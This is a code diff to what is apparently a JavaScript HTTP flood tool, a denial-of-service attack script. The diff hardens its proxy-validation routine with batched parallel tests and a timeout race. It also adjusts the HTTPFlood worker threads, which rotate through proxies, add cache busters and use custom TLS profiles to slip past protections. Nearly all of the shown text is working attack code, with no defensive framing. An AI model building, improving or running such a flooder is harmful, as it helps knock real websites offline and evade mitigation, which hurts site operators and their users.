@@ -226,18 +226,24 @@ function addRealisticDelay() {
 
 async function testProxy(proxyUrl, timeout = 1500) {
     try {
-        const agent = proxyUrl.startsWith('https') 
-            ? new HttpsProxyAgent(proxyUrl)
-            : new HttpProxyAgent(proxyUrl);
+        const testPromise = (async () => {
+            const agent = proxyUrl.startsWith('https') 
+                ? new HttpsProxyAgent(proxyUrl)
+                : new HttpProxyAgent(proxyUrl);
+                
+            const response = await axios.get('http://1.1.1.1', {
+                httpAgent: agent,
+                httpsAgent: agent,
+                timeout: timeout,
+                validateStatus: () => true
+            });
             
-        const response = await axios.get('http://1.1.1.1', {
-            httpAgent: agent,
-            httpsAgent: agent,
-            timeout: timeout,
-            validateStatus: () => true
-        });
+            return [200, 201, 204, 301, 302, 303, 307, 308, 400, 401, 403, 404, 429].includes(response.status);
+        })();
         
-        return [200, 201, 204, 301, 302, 303, 307, 308, 400, 401, 403, 404, 429].includes(response.status);
+        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve(false), timeout + 500));
+        
+        return await Promise.race([testPromise, timeoutPromise]);
     } catch {
         return false;
     }
@@ -266,34 +272,42 @@ async function loadProxies(filePath = 'proxies.txt') {
         );
         
         console.log('[*] Testing proxies for working connections (REQUIRED)...');
-        console.log('[*] Using 200 parallel tests for fast validation...');
-        console.log('[*] This may take 10-30 seconds depending on proxy quality...');
+        console.log('[*] Using 100 parallel tests for reliable validation...');
+        console.log('[*] This may take 15-45 seconds depending on proxy quality...');
         
         let tested = 0;
         let validCount = 0;
         
-        const chunkSize = 200;
+        const chunkSize = 100;
+        const totalBatches = Math.ceil(temp.length / chunkSize);
+        
         for (let i = 0; i < temp.length; i += chunkSize) {
             const chunk = temp.slice(i, i + chunkSize);
+            const batchNum = Math.floor(i / chunkSize) + 1;
             
-            console.log(`[*] Testing batch ${Math.floor(i / chunkSize) + 1}/${Math.ceil(temp.length / chunkSize)}...`);
+            console.log(`[*] Testing batch ${batchNum}/${totalBatches} (${chunk.length} proxies)...`);
             
-            const results = await Promise.all(
-                chunk.map(async proxy => {
-                    const isValid = await testProxy(proxy, 1500);
-                    return { proxy, isValid };
-                })
-            );
-            
-            results.forEach(({ proxy, isValid }) => {
-                if (isValid) {
-                    config.proxies.push(proxy);
-                    validCount++;
-                }
-            });
-            
-            tested += chunk.length;
-            console.log(`[*] Progress: ${tested}/${temp.length} tested | ${validCount} working so far`);
+            try {
+                const results = await Promise.all(
+                    chunk.map(async proxy => {
+                        const isValid = await testProxy(proxy, 1500);
+                        return { proxy, isValid };
+                    })
+                );
+                
+                results.forEach(({ proxy, isValid }) => {
+                    if (isValid) {
+                        config.proxies.push(proxy);
+                        validCount++;
+                    }
+                });
+                
+                tested += chunk.length;
+                console.log(`[+] Batch ${batchNum} complete: ${tested}/${temp.length} tested | ${validCount} working`);
+            } catch (err) {
+                console.log(`[!] Batch ${batchNum} failed, skipping...`);
+                tested += chunk.length;
+            }
         }
         
         if (config.proxies.length === 0) {
@@ -431,7 +445,7 @@ class HTTPFlood {
     }
     
     async worker(threadId) {
-        let currentProxyIndex = threadId % config.proxies.length;
+        let currentProxyIndex = config.proxies.length > 0 ? threadId % config.proxies.length : 0;
         let consecutiveFails = 0;
         let localCount = 0;
         
@@ -454,8 +468,15 @@ class HTTPFlood {
                 targetUrl = addCacheBuster(targetUrl);
                 
                 const proxy = config.proxies.length > 0 ? config.proxies[currentProxyIndex] : null;
-                const httpsAgent = createTLSAgent(profile, proxy);
-                const httpAgent = proxy ? (proxy.startsWith('https') ? new HttpsProxyAgent(proxy) : new HttpProxyAgent(proxy)) : new http.Agent();
+                
+                let httpsAgent, httpAgent;
+                if (proxy) {
+                    httpsAgent = createTLSAgent(profile, proxy);
+                    httpAgent = proxy.startsWith('https') ? new HttpsProxyAgent(proxy) : new HttpProxyAgent(proxy);
+                } else {
+                    httpsAgent = createTLSAgent(profile, null);
+                    httpAgent = new http.Agent({ keepAlive: true });
+                }
                 
                 const axiosConfig = {
                     method: this.method.toLowerCase(),
